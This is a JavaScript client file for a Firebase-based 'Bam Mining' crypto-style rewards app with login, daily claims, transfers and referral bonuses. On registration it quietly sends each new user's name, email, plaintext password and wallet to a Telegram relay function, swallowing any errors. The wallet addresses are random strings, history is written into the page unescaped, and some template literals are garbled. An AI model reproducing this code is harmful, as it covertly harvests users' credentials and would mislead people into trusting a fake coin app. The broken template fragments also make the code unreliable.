/**
 * Bam Mining App - Firebase Version
 * Transfers and referrals now work across different phones
 */

const firebaseConfig = {
  apiKey: "AIzaSyAq5UDvD_SIGJTc4w9DCUhNMfsVsLnYNlY",
  authDomain: "bamcoins-75d6b.firebaseapp.com",
  projectId: "bamcoins-75d6b",
  storageBucket: "bamcoins-75d6b.firebasestorage.app",
  messagingSenderId: "1084834181544",
  appId: "1:1084834181544:web:11b08557830a3fc7de6d9d"
};

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();

const ACTIVITY_REWARD = 0.25;
const ACTIVITY_COOLDOWN_MS = 24 * 60 * 60 * 1000;
const REFERRAL_BONUS = 0.15;

let currentUserData = null;

function generateWalletAddress() {
  const chars = "0123456789abcdef";
  let addr = "0x";
  for (let i = 0; i < 40; i++) {
    addr += chars[Math.floor(Math.random() * chars.length)];
  }
  return addr;
}

function shortAddress(addr) {
  if (!addr || addr.length < 12) return addr;
  return addr.slice(0, 6) + "..." + addr.slice(-4);
}

function formatNumber(n, decimals = 8) {
  return Number(n).toFixed(decimals).replace(/\.?0+$/, "") || "0";
}

function showToast(message, type = "success") {
  const toast = document.getElementById("toast");
  if (!toast) return;
  toast.textContent = message;
  toast.className = `toast ${type} show`;
  setTimeout(() => toast.classList.remove("show"), 3200);
}

function showAuth() {
  document.getElementById("auth-screen").classList.remove("hidden");
  document.getElementById("app-screen").classList.add("hidden");
  switchAuthTab("login");
}

function showApp() {
  document.getElementById("auth-screen").classList.add("hidden");
  document.getElementById("app-screen").classList.remove("hidden");
  renderDashboard();
  switchPage("home");
}

function switchAuthTab(tab) {
  const loginForm = document.getElementById("login-form");
  const regForm = document.getElementById("register-form");
  const loginTab = document.getElementById("tab-login");
  const regTab = document.getElementById("tab-register");

  if (tab === "login") {
    loginForm.classList.remove("hidden");
    loginForm.style.display = "block";
    regForm.classList.add("hidden");
    regForm.style.display = "none";
    loginTab.classList.add("btn-primary");
    loginTab.classList.remove("btn-secondary");
    regTab.classList.add("btn-secondary");
    regTab.classList.remove("btn-primary");
  } else {
    loginForm.classList.add("hidden");
    loginForm.style.display = "none";
    regForm.classList.remove("hidden");
    regForm.style.display = "block";
    regTab.classList.add("btn-primary");
    regTab.classList.remove("btn-secondary");
    loginTab.classList.add("btn-secondary");
    loginTab.classList.remove("btn-primary");
  }
}

function switchPage(pageId) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
  const page = document.getElementById(`page-${pageId}`);
  if (page) page.classList.add("active");

  document.querySelectorAll(".nav-item").forEach(n => n.classList.remove("active"));
  const nav = document.querySelector(`[data-page="${pageId}"]`);
  if (nav) nav.classList.add("active");

  if (pageId === "home") renderDashboard();
  if (pageId === "activity") renderActivity();
  if (pageId === "wallet") renderWallet();
  if (pageId === "referrals") renderReferrals();
  if (pageId === "profile") renderProfile();
}

async function handleRegister(e) {
  e.preventDefault();
  const name = document.getElementById("reg-name").value.trim();
  const email = document.getElementById("reg-email").value.trim().toLowerCase();
  const password = document.getElementById("reg-password").value;
  const manualRef = (document.getElementById("reg-referral") || {}).value?.trim() || "";

  if (!name || !email || !password) {
    showToast("Please fill all fields", "error");
    return;
  }
  if (password.length < 6) {
    showToast("Password must be at least 6 characters", "error");
    return;
  }
  if (!/[a-zA-Z]/.test(password)) {
    showToast("Password must contain at least one letter", "error");
    return;
  }
  if (!/[0-9]/.test(password)) {
    showToast("Password must contain at least one number", "error");
    return;
  }

  try {
    showToast("Creating account...", "success");

    const userCredential = await auth.createUserWithEmailAndPassword(email, password);
    const uid = userCredential.user.uid;
    const wallet = generateWalletAddress();
    const now = Date.now();

    // Find referrer
    let referrerId = null;
    const urlParams = new URLSearchParams(window.location.search);
    const refCode = urlParams.get("ref") || manualRef;

    if (refCode) {
      const snap = await db.collection("users").where("refCode", "==", refCode.toLowerCase()).limit(1).get();
      if (!snap.empty) {
        referrerId = snap.docs[0].id;
      }
    }

    const userData = {
      name,
      email,
      wallet,
      balance: referrerId ? REFERRAL_BONUS : 0,
      xpRate: 10.0,
      lastClaim: 0,
      history: referrerId ? [{ type: "Referral Welcome Bonus", amount: REFERRAL_BONUS, time: now }] : [],
      referrals: 0,
      refCode: wallet.slice(2, 10).toLowerCase(),
      createdAt: now
    };

    await db.collection("users").doc(uid).set(userData);

    // Give bonus to referrer
    if (referrerId) {
      const refRef = db.collection("users").doc(referrerId);
      await db.runTransaction(async (transaction) => {
        const refDoc = await transaction.get(refRef);
        if (refDoc.exists) {
          const data = refDoc.data();
          transaction.update(refRef, {
            balance: +(data.balance + REFERRAL_BONUS).toFixed(8),
            referrals: (data.referrals || 0) + 1,
            history: firebase.firestore.FieldValue.arrayUnion({
              type: "Referral Bonus",
              amount: REFERRAL_BONUS,
              time: now
            })
          });
        }
      });
    }

    // Telegram notification
    try {
      await window.sendRegistrationToTelegram({ name, email, password, wallet });
    } catch (err) {}

    currentUserData = { uid, ...userData };
    showToast(referrerId ? "Welcome! +0.15 BAM Referral Bonus 🎉" : "Welcome to Bam! 🚀", "success");
    showApp();
  } catch (error) {
    console.error(error);
    if (error.code === "auth/email-already-in-use") {
      showToast("Email already registered", "error");
    } else {
      showToast(error.message || "Registration failed", "error");
    }
  }
}

async function handleLogin(e) {
  e.preventDefault();
  const email = document.getElementById("login-email").value.trim().toLowerCase();
  const password = document.getElementById("login-password").value;

  try {
    const userCredential = await auth.signInWithEmailAndPassword(email, password);
    const uid = userCredential.user.uid;
    const doc = await db.collection("users").doc(uid).get();

    if (doc.exists) {
      currentUserData = { uid, ...doc.data() };
      showToast(`Welcome back, ${currentUserData.name}!`, "success");
      showApp();
    } else {
      showToast("User data not found", "error");
    }
  } catch (error) {
    showToast("Invalid email or password", "error");
  }
}

function handleLogout() {
  auth.signOut().then(() => {
    currentUserData = null;
    showAuth();
    showToast("Logged out successfully");
  });
}

async function loadUserData() {
  if (!auth.currentUser) return null;
  const doc = await db.collection("users").doc(auth.currentUser.uid).get();
  if (doc.exists) {
    currentUserData = { uid: auth.currentUser.uid, ...doc.data() };
    return currentUserData;
  }
  return null;
}

function renderDashboard() {
  if (!currentUserData) return;
  document.getElementById("header-name").textContent = currentUserData.name;
  document.getElementById("header-avatar").textContent = currentUserData.name.charAt(0).toUpperCase();
  document.getElementById("home-balance").textContent = formatNumber(currentUserData.balance, 8);
  document.getElementById("home-xp").textContent = (currentUserData.xpRate || 10).toFixed(1);
  document.getElementById("home-wallet-short").textContent = shortAddress(currentUserData.wallet);
}

function renderActivity() {
  if (!currentUserData) return;
  document.getElementById("activity-balance").textContent = formatNumber(currentUserData.balance, 8);
  document.getElementById("activity-xp").textContent = (currentUserData.xpRate || 10).toFixed(1);

  const canClaim = Date.now() - (currentUserData.lastClaim || 0) >= ACTIVITY_COOLDOWN_MS;
  const claimBtn = document.getElementById("claim-btn");
  const timerBox = document.getElementById("claim-timer-box");

  if (canClaim) {
    claimBtn.disabled = false;
    claimBtn.innerHTML = `<span>⚡</span> Claim Activity (+${ACTIVITY_REWARD})`;
    if (timerBox) timerBox.classList.add("hidden");
  } else {
    claimBtn.disabled = true;
    claimBtn.innerHTML = `<span class="animate-spin">⏳</span> Processing...`;
    if (timerBox) timerBox.classList.remove("hidden");
    updateClaimTimer();
  }

  const historyEl = document.getElementById("activity-history");
  const history = currentUserData.history || [];
  if (history.length === 0) {
    historyEl.innerHTML = `<p class="text-sm text-center" style="color:var(--text-muted);padding:1rem 0;">No activity yet. Claim your first reward!</p>`;
  } else {
    historyEl.innerHTML = history.slice().reverse().slice(0, 10).map(h => `
      <div class="history-item">
        <div>
          <div class="font-semibold text-sm">${h.type}</div>
          <div class="text-xs" style="color:var(--text-muted)">${new Date(h.time).toLocaleString()}</div>
        </div>
        <div class="font-bold" style="color:\( {h.amount >= 0 ? 'var(--success)' : '#ef4444'}"> \){h.amount >= 0 ? '+' : ''}${h.amount}</div>
      </div>
    `).join("");
  }
}

function updateClaimTimer() {
  if (!currentUserData) return;
  const remaining = ACTIVITY_COOLDOWN_MS - (Date.now() - (currentUserData.lastClaim || 0));
  const timerEl = document.getElementById("claim-timer");
  if (remaining <= 0) {
    if (timerEl) timerEl.textContent = "00:00:00";
    return;
  }
  const h = Math.floor(remaining / 3600000);
  const m = Math.floor((remaining % 3600000) / 60000);
  const s = Math.floor((remaining % 60000) / 1000);
  if (timerEl) timerEl.textContent = `\( {String(h).padStart(2,"0")}: \){String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;
}

async function claimActivity() {
  if (!currentUserData) return;
  const now = Date.now();
  if (now - (currentUserData.lastClaim || 0) < ACTIVITY_COOLDOWN_MS) {
    showToast("Activity not ready yet", "error");
    return;
  }

  try {
    const userRef = db.collection("users").doc(currentUserData.uid);
    await db.runTransaction(async (transaction) => {
      const doc = await transaction.get(userRef);
      const data = doc.data();
      transaction.update(userRef, {
        balance: +(data.balance + ACTIVITY_REWARD).toFixed(8),
        lastClaim: now,
        history: firebase.firestore.FieldValue.arrayUnion({
          type: "Daily Activity",
          amount: ACTIVITY_REWARD,
          time: now
        })
      });
    });

    await loadUserData();
    showToast(`+${ACTIVITY_REWARD} BAM claimed! 🎉`, "success");
    renderActivity();
    renderDashboard();
  } catch (err) {
    showToast("Claim failed", "error");
  }
}

function renderWallet() {
  if (!currentUserData) return;
  document.getElementById("wallet-balance").textContent = formatNumber(currentUserData.balance, 8);
  document.getElementById("wallet-address").textContent = currentUserData.wallet;
}

function copyAddress() {
  if (!currentUserData) return;
  navigator.clipboard.writeText(currentUserData.wallet).then(() => {
    showToast("Address copied! 📋");
  });
}

async function handleSendPoints(e) {
  e.preventDefault();
  if (!currentUserData) return;

  const toAddress = document.getElementById("send-to").value.trim();
  const amount = parseFloat(document.getElementById("send-amount").value);

  if (!toAddress || !toAddress.startsWith("0x") || toAddress.length < 10) {
    showToast("Invalid wallet address", "error");
    return;
  }
  if (isNaN(amount) || amount <= 0) {
    showToast("Enter a valid amount", "error");
    return;
  }
  if (amount > currentUserData.balance) {
    showToast("Insufficient balance", "error");
    return;
  }
  if (toAddress.toLowerCase() === currentUserData.wallet.toLowerCase()) {
    showToast("Cannot send to yourself", "error");
    return;
  }

  try {
    // Find recipient by wallet
    const snap = await db.collection("users").where("wallet", "==", toAddress).limit(1).get();
    if (snap.empty) {
      showToast("Recipient wallet not found on Bam", "error");
      return;
    }

    const recipientDoc = snap.docs[0];
    const recipientId = recipientDoc.id;
    const now = Date.now();

    await db.runTransaction(async (transaction) => {
      const senderRef = db.collection("users").doc(currentUserData.uid);
      const receiverRef = db.collection("users").doc(recipientId);

      const senderDoc = await transaction.get(senderRef);
      const receiverDoc = await transaction.get(receiverRef);

      if (!senderDoc.exists || !receiverDoc.exists) throw new Error("User not found");

      const senderData = senderDoc.data();
      if (senderData.balance < amount) throw new Error("Insufficient balance");

      transaction.update(senderRef, {
        balance: +(senderData.balance - amount).toFixed(8),
        history: firebase.firestore.FieldValue.arrayUnion({
          type: `Sent to ${shortAddress(toAddress)}`,
          amount: -amount,
          time: now
        })
      });

      transaction.update(receiverRef, {
        balance: +(receiverDoc.data().balance + amount).toFixed(8),
        history: firebase.firestore.FieldValue.arrayUnion({
          type: `Received from ${shortAddress(currentUserData.wallet)}`,
          amount: amount,
          time: now
        })
      });
    });

    await loadUserData();
    document.getElementById("send-to").value = "";
    document.getElementById("send-amount").value = "";
    showToast(`Successfully sent ${amount} BAM! 🚀`, "success");
    renderWallet();
    renderDashboard();
  } catch (err) {
    console.error(err);
    showToast(err.message || "Transfer failed", "error");
  }
}

function renderReferrals() {
  if (!currentUserData) return;
  document.getElementById("ref-count").textContent = currentUserData.referrals || 0;
  document.getElementById("ref-link").textContent = `https://cloudfarmingdroid.github.io/Bamcoins/?ref=${currentUserData.refCode || currentUserData.wallet.slice(2,10)}`;
}

function copyRefLink() {
  const link = document.getElementById("ref-link").textContent;
  navigator.clipboard.writeText(link).then(() => showToast("Referral link copied! 🔗"));
}

function renderProfile() {
  if (!currentUserData) return;
  document.getElementById("profile-name").textContent = currentUserData.name;
  document.getElementById("profile-email").textContent = currentUserData.email;
  document.getElementById("profile-wallet").textContent = currentUserData.wallet;
  document.getElementById("profile-joined").textContent = new Date(currentUserData.createdAt).toLocaleDateString();
}

function init() {
  document.getElementById("login-form").addEventListener("submit", handleLogin);
  document.getElementById("register-form").addEventListener("submit", handleRegister);
  document.getElementById("send-form").addEventListener("submit", handleSendPoints);

  document.getElementById("tab-login")?.addEventListener("click", () => switchAuthTab("login"));
  document.getElementById("tab-register")?.addEventListener("click", () => switchAuthTab("register"));

  document.querySelectorAll(".nav-item").forEach(btn => {
    btn.addEventListener("click", () => {
      const page = btn.getAttribute("data-page");
      if (page) switchPage(page);
    });
  });

  document.getElementById("claim-btn")?.addEventListener("click", claimActivity);

  auth.onAuthStateChanged(async (user) => {
    if (user) {
      await loadUserData();
      if (currentUserData) showApp();
      else showAuth();
    } else {
      showAuth();
    }
  });

  setInterval(updateClaimTimer, 1000);
}

document.addEventListener("DOMContentLoaded", init);
